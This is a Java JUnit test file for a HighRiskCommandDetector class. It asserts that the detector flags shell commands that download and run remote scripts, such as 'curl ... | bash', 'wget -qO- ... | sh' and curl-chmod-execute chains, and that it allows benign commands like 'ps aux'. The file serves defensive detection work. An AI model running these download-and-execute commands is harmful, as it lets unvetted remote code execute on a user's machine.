package com.award.log.security;

import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

class HighRiskCommandDetectorTest {

    private final HighRiskCommandDetector detector = new HighRiskCommandDetector(null);

    @Test
    void detectsPipeDownloadExec() {
        assertTrue(detector.isHighRiskCommand("curl -s http://x/a.sh | bash"));
        assertTrue(detector.isHighRiskCommand("wget -qO- http://x/a.sh | sh"));
    }

    @Test
    void detectsDownloadThenExecWithoutPipe() {
        assertTrue(detector.isHighRiskCommand(
                "curl -o /tmp/script.sh https://example.com/script.sh && bash /tmp/script.sh"));
        assertTrue(detector.isHighRiskCommand(
                "curl -o /tmp/update.sh https://example.com/update.sh && chmod +x /tmp/update.sh && /tmp/update.sh"));
        assertTrue(detector.isHighRiskCommand("bash /tmp/evil.sh"));
    }

    @Test
    void allowsBenignProcessList() {
        assertFalse(detector.isHighRiskCommand("list top cpu processes"));
        assertFalse(detector.isHighRiskCommand("ps aux | head"));
    }
}
